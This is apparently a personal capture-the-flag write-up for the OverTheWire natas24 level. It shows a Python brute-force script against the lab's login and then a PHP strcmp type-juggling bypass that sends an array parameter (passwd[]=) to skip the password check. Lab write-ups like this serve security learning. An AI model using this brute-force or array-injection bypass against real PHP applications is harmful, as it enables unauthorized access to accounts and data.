So the server does a strcmp between $_REQUEST["passwd"] and an unknown string.
First instinct is to brute force the pw. 
Looks like the pw space is 20 chars.... seems like a lot to brute force, but hey let's give it a shot

######### Attempt at brute forcing ###############
import requests
from requests.auth import HTTPBasicAuth
import itertools

alphanumerics = map(chr, range(65,91)+range(97,123)+range(48,58))

passwd = ""

def build_url(passwrd): return "http://natas24.natas.labs.overthewire.org/?passwd=" + passwrd

def is_success(password):
        resp = requests.get(build_url(password), auth=HTTPBasicAuth('natas24','<censred>'))
        return "The credentials for the next level are:" in resp.text



def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

for passw in bruteforce(alphanumerics,20):
        if is_success(passw):
                print "Found: " + passw
                break
        if len(passw)%5 == 0:
                print "Attempt at: " + passw
                
########## After many many hours of not getting a conclusive response ############
Did some digging on how to make strcmp misbehave to make the if statement let us thru to the passowrd printing logic.
First comment on man page (http://php.net/manual/en/function.strcmp.php) has 3 php error as output:

strcmp("foo", array()) => NULL + PHP Warning
strcmp("foo", new stdClass) => NULL + PHP Warning
strcmp(function(){}, "") => NULL + PHP Warning

So we try out the first one with the following URL:
http://natas24.natas.labs.overthewire.org/?passwd[]=

Bam! password for natas25 revealed
